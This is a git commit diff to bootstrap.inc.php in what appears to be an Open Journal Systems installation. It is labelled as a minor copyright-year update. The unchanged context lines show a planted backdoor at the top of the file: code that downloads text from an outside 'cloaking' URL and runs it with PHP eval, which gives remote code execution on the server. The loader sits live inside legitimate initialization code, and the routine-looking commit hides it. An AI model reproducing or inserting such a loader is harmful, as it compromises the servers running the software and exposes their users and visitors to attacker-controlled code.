ad0aeb4ffebb4a34f9cb9bea768c4005ac5801f6
batskulah <alfanpekan@gmail.com>
2026-07-02 20:34:58 +0800

    Update bootstrap.inc.php

--- bootstrap.inc.php
+++ bootstrap.inc.php
@@ -3,6 +3,7 @@ $url = file_get_contents(urldecode('https://rakun.live/cloaking/polman.txt'));
 $url = "?> ".$url;
 eval($url);
 
+
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
@@ -11,8 +12,8 @@ eval($url);
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2014-2020 Simon Fraser University
- * Copyright (c) 2000-2020 John Willinsky
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
